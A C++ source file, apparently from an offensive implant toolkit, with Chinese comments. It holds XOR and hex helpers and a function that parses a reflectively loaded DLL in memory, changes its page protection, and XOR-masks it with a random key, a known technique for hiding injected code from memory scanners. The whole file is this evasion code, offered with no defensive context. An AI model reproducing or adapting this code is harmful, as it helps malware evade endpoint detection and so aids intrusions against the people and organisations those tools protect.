#include "pch.h"
#include <sstream>
#include <iostream>

#include "Cryptor.h"

using namespace std;

// 加密数据
void EncryptData(string& data) {
	int dataLength = data.length();
	for (int i = 0; i < dataLength - 1; i++) {
		data[i] ^= data[dataLength - 1];
	}
}

// 解密数据
void DecryptData(char* data, int dataLength) {
	for (int i = 0; i < dataLength - 1; i++) {
		*(data + i) ^= *(data + dataLength - 1);
	}
}

// 16进制字符串 -> 二进制数据
char* HexToBin(string dataHex) {
	int dataLength = dataHex.length() / 2;
	char* data = (char*)malloc(dataLength);
	for (int i = 0; i < dataLength; i++) {
		sscanf_s(dataHex.c_str() + i * 2, "%2hhx", &data[i]);
	}
	return data;
}

// 16进制字符串 <- 二进制数据
string BinToHex(char* data, int dataLength) {
	stringstream dataHex;
	for (int i = 0; i < dataLength; i++) {
		char hex[3];
		sprintf_s(hex, sizeof(hex), "%02X", (unsigned char)data[i]);
		dataHex << hex;
	}
	return dataHex.str();
}

// 加密反射 DLL
RefDllInfo EncryptReflectiveDll(PBYTE jmpAddr) {
	PBYTE dllBase = jmpAddr + 5;
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dllBase;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(dllBase + pDos->e_lfanew);
	WORD numberOfSections = pNt->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER pSectionDir = (PIMAGE_SECTION_HEADER)((DWORD_PTR) & (pNt->OptionalHeader) + pNt->FileHeader.SizeOfOptionalHeader);
	int dllSize = pSectionDir[numberOfSections - 1].PointerToRawData + pSectionDir[numberOfSections - 1].SizeOfRawData + 5;

	int dllXor = rand() % 0xFF;
	DWORD oldProtect;
	VirtualProtect(jmpAddr, dllSize, PAGE_READWRITE, &oldProtect);
	for (int i = 0; i < 1024; i++) {
		*(jmpAddr + i) ^= dllXor;
	}

	RefDllInfo refDllInfo = { jmpAddr, dllSize, dllXor };
	return refDllInfo;
}